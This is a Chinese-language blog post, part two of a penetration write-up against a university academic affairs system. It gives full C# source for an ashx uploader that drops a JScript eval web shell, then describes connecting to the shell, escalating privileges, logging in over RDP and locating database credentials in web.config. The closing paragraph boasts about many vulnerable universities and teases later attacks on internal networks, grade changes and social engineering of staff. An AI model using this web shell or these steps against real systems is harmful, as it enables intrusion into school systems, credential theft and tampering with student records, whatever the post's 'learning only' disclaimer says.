---
layout: post
title: 某教务系统注入getshell提权一条龙(下)
date: 2017-03-14 11:14:42
comments: true
tags:
	- 安全攻防
---

### 前言
><font color="#ff0000">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;**文中提及的部分技术，可能带有一定攻击性，仅供安全学习和教学用途，禁止非法使用！**</font>

### 正文
>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;上篇说道注入到管理员登录密码登录，下面讲介绍如何拿shell提权。<!--more-->

### 漏洞详情
>登录教务系统后，在信息公告栏里面有个教务公告发布，这里可以上传

![](/images/pasted-53.PNG)

![](/images/pasted-53.5.PNG)

>这里对ashx文件没有过滤，所以可以上传一个ashx马来生成aspx一句话

poc:
```C#
<%@ WebHandler Language="C#" Class="Handler" %> 
using System; 
using System.Web; 
using System.IO; 
public class Handler : IHttpHandler { 
    public void ProcessRequest (HttpContext context) { 
        context.Response.ContentType = "text/plain"; 
        string show="<%@ Page Language=\"Jscript\"%><%eval(Request.Item[\"chopper\"],\"unsafe\");%>"; 
        StreamWriter file1= File.CreateText(context.Server.MapPath("root.aspx")); 
        file1.Write(show); 
        file1.Flush(); 
        file1.Close(); 
    } 
    public bool IsReusable { 
        get { 
            return false; 
        } 
    } 
} 
```

>会上传在wbwj目录下

>访问http://***.***.com/wbwj/***.ashx，会在同目录生成一个root.aspx一句话，密码 chopper

>一句话地址，http://***.***.com/wbwj/root.aspx  连接之

![](/images/pasted-54.PNG)

>看下权限,还是挺大的，

![](/images/pasted-55.PNG)

![](/images/pasted-56.PNG)

![](/images/pasted-57.PNG)

> 直接上传神器提权之。

![](/images/pasted-58.PNG)

>3389端口没有改，直接连接。

![](/images/pasted-59.PNG)

![](/images/pasted-60.PNG)

> 在里面翻了半天都没找到数据库，然后看了下端口，本机的1521端口根本没开，而本机和内网另一台机器的1521端口连接着，看来是站库分离了。

![](/images/pasted-61.PNG)

>在站的根目录，web.config文件中，可以看到数据库地址，以及连接数据库的用户名和加密密码

>![](/images/pasted-100.jpg)


### 总结
> 这个是什么教务系统就不多说，用过的一看就知道。
> 有很多高校大学用的这个教务系统，早在去年一晚的时间就发现了50多个高校都存在漏洞，不过都上报给了乌云。
> 后期还会写更多的渗透文章，漫游内网，更改led大屏幕，免费上网，好(gai)好(cheng)学(ji)习，社工辅导员qq微博等等。
>再次提醒：
> **文中提及的部分技术，可能带有一定攻击性，仅供安全学习和教学用途，禁止非法使用！**